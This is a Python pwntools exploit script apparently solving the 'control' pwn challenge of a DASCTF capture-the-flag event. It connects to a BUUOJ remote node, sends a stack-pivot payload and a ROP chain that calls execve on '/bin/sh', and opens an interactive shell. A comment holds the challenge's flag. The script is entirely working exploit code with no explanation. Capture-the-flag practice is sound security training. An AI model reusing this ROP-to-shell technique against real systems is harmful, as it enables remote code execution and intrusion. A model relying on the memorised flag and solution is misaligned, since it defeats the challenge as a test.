from pwn import*

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]
ret=p64(0x402238)
pop_rdi=p64(0x401c72)
pop_rsi=p64(0x405285)
pop_rdx=p64(0x401aff)
pop_rax=p64(0x462c27)
syscall=p64(0x040161e)

#p=process('./control')
#DASCTF{d477cabc-de69-4a6a-b5ec-6211dd30af47}
#gdb.attach(p,'b* 0x402164')
while(1):
    try:
        #p=process('./control')
        p=remote('node5.buuoj.cn',26647)
        p.recvuntil('>')
        sh=b'/bin/sh\x00'
        p.sendline(sh)
        sleep(0.1)
        p.recvuntil('?')
        Rop=pop_rdi+p64(0x4D3350)+pop_rsi+p64(0)+pop_rdx+p64(0)+pop_rax+p64(59)+syscall
        payload=ret+p64(0x4D3358)+p64(0x4621A7)+p64(0x402237)+p64(0)+p64(0x4D3360)+p64(0x100)+p64(0x402237)*7+b'\x08'
        p.send(payload)
        sleep(0.2)
        p.sendline(Rop)
        sleep(0.2)
        p.sendline(b'ls')
        sleep(0.1)
        p.sendline(b'ls')
        p.interactive()
    except:
        p.close()